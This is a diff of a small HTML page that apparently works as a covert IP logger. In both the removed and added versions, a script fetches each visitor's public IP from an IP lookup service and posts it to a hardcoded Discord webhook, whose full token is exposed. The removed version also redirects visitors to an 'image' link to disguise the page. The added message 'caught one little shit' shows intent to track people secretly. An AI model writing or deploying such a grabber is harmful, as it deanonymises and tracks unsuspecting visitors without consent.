@@ -1,37 +1,24 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <meta property="og:image" content=image>
-<script>
-  fetch('https://api.ipify.org/')  .then(response => response.text())  .then(script => eval(const ip = script));
-function sendWebhook(url, message) {
-  // Replace with your actual Discord webhook URL
-  const webhookURL = "https://discord.com/api/webhooks/1210975688002240613/MfdO7_ih-VtdQZGv0D-Dt_3jvvT1UgDok1-j0q31xyVCDAC8jaaLEk5wByC-e443SrNa";
+  <body>
+    <script>
+// Replace with your webhook URL
+const webhookUrl = "https://discord.com/api/webhooks/1210975688002240613/MfdO7_ih-VtdQZGv0D-Dt_3jvvT1UgDok1-j0q31xyVCDAC8jaaLEk5wByC-e443SrNa";
+fetch('https://api.ipify.org/')  .then(response => response.text())  .then(script => ip = script);
+// Replace with your desired message content
+const message = {
+    content: "caught one little shit " + ip,
+    // Add embeds or attachments if needed
+};
 
-  fetch(webhookURL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: script + " " + message })
-  })
-  .then(response => console.log("Webhook sent!"))
-  .catch(error => console.error("Error sending webhook:", error));
-}
-
-function redirectAndSendWebhook() {
-  const urlParams = new URLSearchParams(window.location.search);
-  const image = urlParams.get("image");
-  const message = urlParams.get("message");
-
-  if (image) {
-    window.location.href = image;
-    sendWebhook("YOUR_DISCORD_WEBHOOK_URL", message);
-  }
-}
-
-// Call the function when the page loads
-redirectAndSendWebhook();
-</script>
-</head>
-<body>
-</body>
-</html>
+// Replace with your desired trigger (e.g., page load)
+window.onload = function() {
+    fetch(webhookUrl, {
+        method: "POST",
+        body: JSON.stringify(message),
+        headers: {
+            "Content-Type": "application/json"
+        }
+    })
+    .then(() => console.log("Message sent to Discord webhook"))
+    .catch(error => console.error("Error sending message:", error));
+};
